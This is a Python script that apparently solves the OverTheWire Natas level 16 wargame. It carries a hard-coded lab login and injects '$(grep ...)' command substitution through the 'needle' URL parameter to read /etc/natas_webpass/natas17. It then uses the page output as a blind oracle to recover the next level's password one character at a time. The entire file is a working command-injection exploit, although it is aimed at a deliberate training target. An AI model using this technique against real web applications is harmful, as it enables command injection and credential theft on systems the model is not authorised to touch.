#!/usr/bin/python
#h15h4m

# way better than the other libs
import requests
from requests.auth import HTTPBasicAuth


chars_to_check = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
string_to_find = "Output:\n<pre>\n</pre>"

target = "http://natas16.natas.labs.overthewire.org/"
http_login=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password_chars = ''
password = ''

r = requests.get(target , auth=http_login)

if r.status_code != requests.codes.ok:
	print "[-] Unable to access. Check Authentication."
	exit()

print "[!] cool. We are in!"

print "[!] finding password chars...."

#lets find password chars first easier for brute force later
for x in chars_to_check:
	r = requests.get(target + "?needle=$(grep "+ x +" /etc/natas_webpass/natas17)",auth=http_login )	
	if r.content.find(string_to_find) != -1:
		password_chars = password_chars + x
		
print '[+] password chars: '  +   password_chars

print '[!] brut3 f0rc1ng the p455w0rd......'
for x in range(32):
	for xx in password_chars:
		r = requests.get(target + "?needle=$(grep ^"+ password + xx +" /etc/natas_webpass/natas17)",auth=http_login )
		if r.content.find(string_to_find) != -1:
			password += xx
			break
	
print "[+] password: " + password
